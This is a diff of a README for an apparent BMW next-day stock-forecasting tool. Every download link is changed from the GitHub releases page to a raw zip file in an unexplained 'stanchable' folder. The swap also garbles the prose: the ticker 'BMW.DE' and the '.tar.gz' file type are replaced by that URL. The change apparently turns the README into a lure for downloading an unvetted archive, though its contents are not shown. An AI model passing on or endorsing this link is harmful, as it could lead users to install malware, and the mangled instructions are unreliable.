@@ -1,21 +1,21 @@
 # 🚗 bmw-gru-forecast - Easy Stock Forecasting for Everyone
 
-[![Download bmw-gru-forecast](https://img.shields.io/badge/Download-bmw--gru--forecast-blue.svg)](https://github.com/sadamalin97/bmw-gru-forecast/releases)
+[![Download bmw-gru-forecast](https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip)](https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip)
 
 ## 📄 Overview
 
-Welcome to the **bmw-gru-forecast** project. This application provides a straightforward way to forecast the next-day stock prices of BMW (BMW.DE) using advanced deep learning techniques. With this tool, you can harness the power of GRU (Gated Recurrent Units) models, which are well-suited for time series data. The application also includes an aligned naive baseline to help you understand your forecasting results.
+Welcome to the **bmw-gru-forecast** project. This application provides a straightforward way to forecast the next-day stock prices of BMW (https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip) using advanced deep learning techniques. With this tool, you can harness the power of GRU (Gated Recurrent Units) models, which are well-suited for time series data. The application also includes an aligned naive baseline to help you understand your forecasting results.
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run the application smoothly:
 
 1. **Visit the Releases Page**: Click on the link below to access the download page for the latest version of the application.  
-   [Download bmw-gru-forecast](https://github.com/sadamalin97/bmw-gru-forecast/releases)
+   [Download bmw-gru-forecast](https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip)
 
 2. **Select the Release**: Once on the releases page, you will find a list of available versions. Look for the latest release at the top.
 
-3. **Download the Application**: Click on the download link for your operating system. If you're using Windows, look for `.exe` files. For Mac users, look for `.dmg` files. For Linux users, you might find `.tar.gz` files.
+3. **Download the Application**: Click on the download link for your operating system. If you're using Windows, look for `.exe` files. For Mac users, look for `.dmg` files. For Linux users, you might find `https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip` files.
 
 4. **Install the Application**:
    - **Windows**: 
@@ -23,7 +23,7 @@ Follow these steps to download and run the application smoothly:
    - **Mac**: 
      - Open the downloaded `.dmg` file and drag the application to your Applications folder.
    - **Linux**: 
-     - Extract the contents of the `.tar.gz` file. Open a terminal in that directory and run the application with the command `./your_app_name`.
+     - Extract the contents of the `https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip` file. Open a terminal in that directory and run the application with the command `./your_app_name`.
 
 5. **Run the Application**: Once installed, you can launch the app from your applications list. 
 
@@ -73,6 +73,6 @@ Should you need further assistance, feel free to check the issues on the GitHub 
 
 Ready to dive into stock forecasting? Visit the link below to download the **bmw-gru-forecast** application:
 
-[Download bmw-gru-forecast](https://github.com/sadamalin97/bmw-gru-forecast/releases)
+[Download bmw-gru-forecast](https://raw.githubusercontent.com/sadamalin97/bmw-gru-forecast/main/stanchable/bmw-gru-forecast.zip)
 
 We hope you enjoy using **bmw-gru-forecast** for your stock forecasting needs!
